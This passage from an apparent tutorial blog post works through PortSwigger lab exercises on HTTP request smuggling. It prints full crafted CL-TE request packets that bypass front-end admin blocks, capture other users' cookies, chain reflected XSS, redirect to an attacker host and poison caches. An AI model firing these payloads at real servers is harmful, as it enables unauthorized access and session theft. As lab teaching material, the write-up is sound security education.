</span></code></pre></div><p>The second:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>G</span><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>

<span class=g>0
</span><span class=g>
</span><span class=g>
</span></code></pre></div><p>This sent an unrecognized HTTP Method GPOST request.</p>
<h2 id=attack-surface>Attack Surface</h2>
<p>Above we have introduced several attack methods, let us see what these attack methods can be used for. We will also cooperate with the experimental environment to help understand and reproduce.</p>
<h3 id=bypass-front-end-security-controls>Bypass Front-end Security Controls</h3>
<p>Two experimental environments are provided here. One is CL-TE <a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a> and the othter is TE-CL <a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a>.The two experiments finally achieved the same goal. Here we randomly choose CL-TE for experiments.</p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding. There&rsquo;s an admin panel at /admin, but the front-end server blocks access to it.</p>
<p>To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.</p>
</blockquote>
<p>The architecture is the same, but this time we need to use HTTP Smuggling to obtain admin permissions and delete the carlos user.</p>
<p>After we generate the LAB, if we directly access <code>/admin</code>, we will find<code>"Path / admin is blocked"</code>. It seems that we cannot access<code> /admin</code> through normal methods. Then we try HTTP Smuggling and send the following data packet twice.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>28</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

<span class=g>0
</span><span class=g>
</span><span class=g>GET /admin HTTP/1.1
</span><span class=g>
</span><span class=g>
</span></code></pre></div><p>The response obtained is as follows.</p>
<p><figure class=gallery-image style=flex-grow:247;flex-basis:593px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520132539.png data-size=2732x1104><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520132539.png width=2732 height=1104 srcset="/2019/12/08/HTTP-Smuggling-en/20200520132539_hu82cea801bede417e51f8b19f26489d8c_435403_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520132539_hu82cea801bede417e51f8b19f26489d8c_435403_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p><figure class=gallery-image style=flex-grow:244;flex-basis:586px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520138223.png data-size=2692x1102><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520138223.png width=2692 height=1102 srcset="/2019/12/08/HTTP-Smuggling-en/20200520138223_huf939152edb9b38a2923b84736a7e119d_382911_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520138223_huf939152edb9b38a2923b84736a7e119d_382911_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>You can see that the second request we got the response of <code>/admin</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;container is-page&#34;</span><span class=p>&gt;</span>
  Admin interface only available if logged in as an administrator, or if requested as localhost
<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</code></pre></div><p>So we add the HOST header and send it again a few times</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>45</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

<span class=g>0
</span><span class=g>
</span><span class=g>GET /admin HTTP/1.1
</span><span class=g>Host: localhost
</span><span class=g>
</span><span class=g>
</span></code></pre></div><p>We can see that the content of the <code>/admin</code> panel. If it dosen&rsquo;t work, you can send it a few times.</p>
<p><figure class=gallery-image style=flex-grow:250;flex-basis:601px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520139301.png data-size=2716x1084><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520139301.png width=2716 height=1084 srcset="/2019/12/08/HTTP-Smuggling-en/20200520139301_hu7bedf9275de91192ecee6020683bccc8_362890_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520139301_hu7bedf9275de91192ecee6020683bccc8_362890_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>We got the deleted api, so we can use HTTP Smuggling to access this <code>/admin/delete?username=carlos</code>, and construct the following data packet.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>63</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

<span class=g>0
</span><span class=g>
</span><span class=g>GET /admin/delete?username=carlos HTTP/1.1
</span><span class=g>Host: localhost
</span><span class=g>
</span><span class=g>
</span></code></pre></div><p><figure class=gallery-image style=flex-grow:477;flex-basis:1146px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520130304.png data-size=2504x524><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520130304.png width=2504 height=524 srcset="/2019/12/08/HTTP-Smuggling-en/20200520130304_hu0175d88a59eeb36d8c49299c38c5b63d_158004_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520130304_hu0175d88a59eeb36d8c49299c38c5b63d_158004_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>This attack method is similar to HTTP SSRF. The main point is to control the value of CL. For example, the value of CL in the first packet is 28, which is calculated as follows:</p>
<pre tabindex=0><code>0\r\n														--&gt; 3 bytes
\r\n														--&gt; 2 bytes
GET /admin HTTP/1.1\r\n					--&gt; 19+2 = 21 bytes
\r\n														--&gt; 2 bytes
</code></pre><p>So it is 3+2+21+2 = 28 bytes in total.</p>
<p>The situation of TE-CL is similar, so the example will not be repeated here.</p>
<h3 id=revealing-front-end-request-rewriting>Revealing Front-end Request Rewriting</h3>
<blockquote>
<p>In some network environments, the front-end proxy server does not forward the request directly to the back-end server after receiving the request. Instead, it adds some necessary fields and then forwards it to the back-end server. These fields are required by the backend server to process the request, such as:</p>
<p>- Describe the protocol name and password used by the TLS connection
- XFF header containing the user&rsquo;s IP address
- User&rsquo;s session token ID</p>
<p>In short, if we can&rsquo;t get the fields added or rewritten by the proxy server, our smuggled past requests can&rsquo;t be processed correctly by the backend server. So how do we get these values? PortSwigger provides a very simple method, mainly in three major steps:</p>
<p>- Find a POST request that can output the value of the request parameter to the response
- Put the special parameter found in the POST request at the end of the message.
- Then smuggle this request and then send a normal request directly, and some fields that the front-end server rewrites for this request will be displayed.</p>
</blockquote>
<p>Sometimes the Front server adds some request headers to the forwarded request and forwards them to the Backend server. We can use HTTP Smuggling to leak these request headers. We also use LAB to understand. <a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding.</p>
<p>There&rsquo;s an admin panel at /admin, but it&rsquo;s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It&rsquo;s similar to the X-Forwarded-For header but has a different name.</p>
<p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.</p>
</blockquote>
<p>According to the title hint here, the scene is a CL-TE scene and a search box is given. We try to search for a 123 at will. We can find that the search result &ldquo;123&rdquo; is directly echoed into the corresponding one.</p>
<p><figure class=gallery-image style=flex-grow:236;flex-basis:567px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520137721.png data-size=2744x1160><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520137721.png width=2744 height=1160 srcset="/2019/12/08/HTTP-Smuggling-en/20200520137721_hub50b6fc5f7ebef0fd44a371cf6c0350f_398118_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520137721_hub50b6fc5f7ebef0fd44a371cf6c0350f_398118_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>Attempted access using HTTP Smuggling, but was blocked.</p>
<p><figure class=gallery-image style=flex-grow:242;flex-basis:583px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520130471.png data-size=2760x1136><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520130471.png width=2760 height=1136 srcset="/2019/12/08/HTTP-Smuggling-en/20200520130471_hu5f3e54a29af102d9ba6c674829d383e8_446113_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520130471_hu5f3e54a29af102d9ba6c674829d383e8_446113_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>But we can try to use the search echo to leak the request header forwarded by the Front server:</p>
<p><figure class=gallery-image style=flex-grow:241;flex-basis:580px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520136832.png data-size=2746x1136><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520136832.png width=2746 height=1136 srcset="/2019/12/08/HTTP-Smuggling-en/20200520136832_hu9994654d2469390c0de1e33059aa8ff0_427182_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520136832_hu9994654d2469390c0de1e33059aa8ff0_427182_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>If you only add the X-*-Ip request header later, you cannot access the admin panel, because this will make Backend receive two duplicate request headers. In this scenario, the Backend server judges the duplicate request headers.</p>
<p><figure class=gallery-image style=flex-grow:396;flex-basis:950px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520132406.png data-size=2376x600><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520132406.png width=2376 height=600 srcset="/2019/12/08/HTTP-Smuggling-en/20200520132406_hu16aa6ca07f473a93dbeb9e104dc7afc4_177895_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520132406_hu16aa6ca07f473a93dbeb9e104dc7afc4_177895_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>So we need to &ldquo;hide&rdquo; the request headers added by the Front server, we can use Smuggling to &ldquo;hide&rdquo; the request headers added by other Front servers, and then we can get the admin panel.</p>
<p><figure class=gallery-image style=flex-grow:243;flex-basis:585px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520135698.png data-size=2750x1128><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520135698.png width=2750 height=1128 srcset="/2019/12/08/HTTP-Smuggling-en/20200520135698_hu80fb90c4bcf5214543a7f721439e0856_396396_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520135698_hu80fb90c4bcf5214543a7f721439e0856_396396_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>The whole process looks relatively simple, but if you do it carefully, you will find the CL value is quite important. Let&rsquo;s take a look at how the CL value of the packet requested by the Front is calculated:</p>
<pre tabindex=0><code>0\r\n																										--&gt;	3 bytes
\r\n																										--&gt; 2 bytes
POST / HTTP/1.1\r\n																			--&gt;	17 bytes
Content-Length: 70\r\n																	--&gt;	20 bytes
Content-Type: application/x-www-form-urlencoded\r\n			--&gt;	49 bytes
\r\n																										--&gt; 2 bytes
search=123																							--&gt; 10 bytes
</code></pre><p>There are 103 bytes in total. And the CL here may not be 70. Here, we only control how many bytes are leaked.</p>
<p>Another thing to note is that if you don&rsquo;t add a Content-Type field, you need to add a CRLF at the end, otherwise it will return 400.</p>
<h3 id=capturing-other-users-requests>Capturing other users' requests</h3>
<p>Now that we can get middleware requests, of course, we can also try to get requests from other users, and also get cookies, etc. <a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to capture other users' requests</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding.</p>
<p>To solve the lab, smuggle a request to the back-end server that causes the next user&rsquo;s request to be stored in the application. Then retrieve the next user&rsquo;s request and use the victim user&rsquo;s cookies to access their account.</p>
</blockquote>
<p>The principle is relatively simple. We can find a place to send a comment, and then use the comment to perform HTTP Smuggling. For example, we can construct the following request packet.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>ac951f7d1e9ea625803c617f003f005c.web-security-academy.net</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
<span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>271</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 600
Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At

csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;postId=5&amp;name=1&amp;email=1%40qq.com&amp;website=http%3A%2F%2Fwww.baidu.com&amp;comment=1
</code></pre></div><p>As long as the later CL is large enough, we can use HTTP Smuggling to stitch the next user&rsquo;s request into our last comment parameter, and then we can see the request header of others when we look at the comment.</p>
<p><figure class=gallery-image style=flex-grow:120;flex-basis:288px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520138700.png data-size=1560x1296><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520138700.png width=1560 height=1296 srcset="/2019/12/08/HTTP-Smuggling-en/20200520138700_hua6e8412a6ef3578e4ab827630a75d1bf_499712_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520138700_hua6e8412a6ef3578e4ab827630a75d1bf_499712_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<h3 id=exploit-reflected-xss>Exploit Reflected XSS</h3>
<p>This usage scenario may be limited and rare, but if HTTP Smuggling & reflected XSS exists, we can combinate two methods to leak others' cookies.</p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding.</p>
<p>The application is also vulnerable to <a class=link href=https://portswigger.net/web-security/cross-site-scripting/reflected target=_blank rel=noopener>reflected XSS</a> via the User-Agent header.</p>
<p>To solve the lab, smuggle a request to the back-end server that causes the next user&rsquo;s request to receive a response containing an XSS exploit that executes alert(1).</p>
</blockquote>
<p>Still in the CL-TE, we can find a reflection XSS at the UA, but this is useless, so we have to find some way to upgrade the hazard.</p>
<p><figure class=gallery-image style=flex-grow:243;flex-basis:584px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520139474.png data-size=2750x1130><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520139474.png width=2750 height=1130 srcset="/2019/12/08/HTTP-Smuggling-en/20200520139474_hude383cc9b3ba2c29595540bbc50bb3d5_342653_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520139474_hude383cc9b3ba2c29595540bbc50bb3d5_342653_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>We can construct the following packets, just send them once.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>ac811f011e27d43b80301693005a0007.web-security-academy.net</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>150</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

<span class=g>0
</span><span class=g>
</span><span class=g>GET /post?postId=5 HTTP/1.1
</span><span class=g>User-Agent: &#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span><span class=g>Content-Type: application/x-www-form-urlencoded
</span><span class=g>Content-Length: 5
</span><span class=g>
</span><span class=g>x=1
</span></code></pre></div><p>Then we casually visit any page on the site and it will <code>alert(1)</code> because our request is embedded in the second request above.</p>
<p><figure class=gallery-image style=flex-grow:492;flex-basis:1182px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520132106.png data-size=2050x416><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520132106.png width=2050 height=416 srcset="/2019/12/08/HTTP-Smuggling-en/20200520132106_hu01eadd1b5dcc0165595c765d37250671_114636_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520132106_hu01eadd1b5dcc0165595c765d37250671_114636_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p><figure class=gallery-image style=flex-grow:144;flex-basis:346px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520131892.png data-size=2200x1524><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520131892.png width=2200 height=1524 srcset="/2019/12/08/HTTP-Smuggling-en/20200520131892_hu35572018ca65b54a1871444088798712_637223_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520131892_hu35572018ca65b54a1871444088798712_637223_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<h3 id=turn-an-on-site-redirect-into-an-open-redirect>Turn An On-Site Redirect Into An Open Redirect</h3>
<p>This attack scenario is when the target uses a 30x code to redirect and uses the Host header to redirect. For example, we send following requests.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>GET</span> <span class=nn>/home</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>normal-website.com</span>
</code></pre></div><p>We will get responses.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>301</span> <span class=ne>Moved Permanently</span>
<span class=n>Location</span><span class=o>:</span> <span class=l>https://normal-website.com/home/</span>
</code></pre></div><p>It looks harmless, but if we cooperate with HTTP Smuggling, it will be a problem. Such as:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>vulnerable-website.com</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>54</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

<span class=g>0
</span><span class=g>
</span><span class=g>GET /home HTTP/1.1
</span><span class=g>Host: attacker-website.com
</span><span class=g>Foo: X
</span></code></pre></div><p>The subsequent requests after smuggling look like this:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>GET</span> <span class=nn>/home</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>attacker-website.com</span>
<span class=n>Foo</span><span class=o>:</span> <span class=l>XGET /scripts/include.js HTTP/1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>vulnerable-website.com</span>
</code></pre></div><p>Then if the server redirects according to the Host header, we will get the following response.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>301</span> <span class=ne>Moved Permanently</span>
<span class=n>Location</span><span class=o>:</span> <span class=l>https://attacker-website.com/home/</span>
</code></pre></div><p>In this way, the user who visits <code>/scripts/include.js</code> will be redirected to the URL we control.</p>
<h3 id=perform-web-cache-poisoning>Perform Web Cache Poisoning</h3>
<p>This scenario is also based on the Host redirect attack scenario above. If the Front server still has cache static resources, we can cooperate with HTTP Smuggling to perform cache poisoning. <a class=link href=https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning target=_blank rel=noopener>Lab: Exploiting HTTP request smuggling to perform web cache poisoning</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding. The front-end server is configured to cache certain responses.</p>
<p>To solve the lab, perform a <a class=link href=https://portswigger.net/web-security/request-smuggling target=_blank rel=noopener>request smuggling</a> attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.</p>
</blockquote>
<p>This environment is also a scenario where the host can be modified to redirect, and the <code>/post/next?postId=2</code> route redirect to <code>/post?postId=4</code>.</p>
<p>According to the description of the call, we need to implement cache poisoning. For example, here we choose <code>/resources/js/tracking.js</code> for poisoning. LAB also gives us a service for manufacturing poisoning, so we can set the following settings.</p>
<p><figure class=gallery-image style=flex-grow:95;flex-basis:229px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520130636.png data-size=1488x1556><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520130636.png width=1488 height=1556 srcset="/2019/12/08/HTTP-Smuggling-en/20200520130636_hue1b3d443f7be1b59207b551904f71de7_131373_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520130636_hue1b3d443f7be1b59207b551904f71de7_131373_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>Send the following packets once.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>ac7a1f141fadd93d801c469f005500bf.web-security-academy.net</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>session=f6c7ZBB52a6iedorGSywc8jM6USu4685</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
<span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>178</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

0

GET /post/next?postId=3 HTTP/1.1
Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
</code></pre></div><p>Then visit <code>/resources/js/tracking.js</code>:</p>
<p><figure class=gallery-image style=flex-grow:704;flex-basis:1691px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520135018.png data-size=2706x384><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520135018.png width=2706 height=384 srcset="/2019/12/08/HTTP-Smuggling-en/20200520135018_hu8304788bd5c68547a9f6dded523935ab_122797_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520135018_hu8304788bd5c68547a9f6dded523935ab_122797_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>We can see that the redirect address of the response packet has been changed to the our exploit address, and then we visit the normal server homepage.</p>
<p><figure class=gallery-image style=flex-grow:454;flex-basis:1091px>
